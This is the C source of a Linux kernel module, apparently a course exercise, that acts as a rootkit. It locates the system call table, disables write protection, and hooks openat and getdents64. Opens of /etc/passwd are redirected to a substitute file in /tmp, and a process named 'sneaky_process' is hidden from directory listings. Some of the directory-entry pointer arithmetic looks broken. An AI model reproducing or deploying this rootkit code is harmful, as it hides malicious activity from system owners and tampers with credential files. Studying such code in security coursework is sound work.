#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>
#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long * sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

asmlinkage int (*original_getdents64)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
  // Implement the sneaky part here
  int fd;
  char * filename;
  fd = (int)(regs->di);
  filename = (char *)(regs->si);
  if (strcmp(filename, "/etc/passwd") == 0) {
    printk(KERN_INFO "Hello darkness my old friend, %s", filename);
    copy_to_user((void *)(filename), "/tmp/passwd", sizeof("/tmp/passwd"));
  }
  return (*original_openat)(regs);
}

typedef struct linux_dirent64 {
  unsigned long d_ino;
  off_t d_off;
  unsigned short d_reclen;
  char d_type;
  char d_name[];
} ld64;

asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
  int nread = original_getdents64(regs);
  ld64 * d;
  int index = 0;
  while (index < nread) {
    d = (ld64 *)(regs->si + index);
    printk(KERN_INFO "The name is: %s, %d, %d, %d",
           d->d_name,
           (int)d->d_reclen,
           nread,
           index);
    if (strcmp(d->d_name, PREFIX) == 0) {
      /* printk(KERN_INFO "Gotcha !, %d", (nread - index - d->d_reclen)); */
      memmove(d, d + d->d_reclen, nread - index - d->d_reclen);
      nread -= d->d_reclen;
    }
    index += d->d_reclen;
  }
  printk(KERN_INFO "Nread now is: %d", nread);
  return nread;
}

static char * value = "sdfkasdlfkjasdlkfj";
module_param(value, charp, 0000);

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  printk(KERN_INFO "%s is the PID of sneaky_process\n", value);

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  // You need to replace other system calls you need to hack here

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was nevedr there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
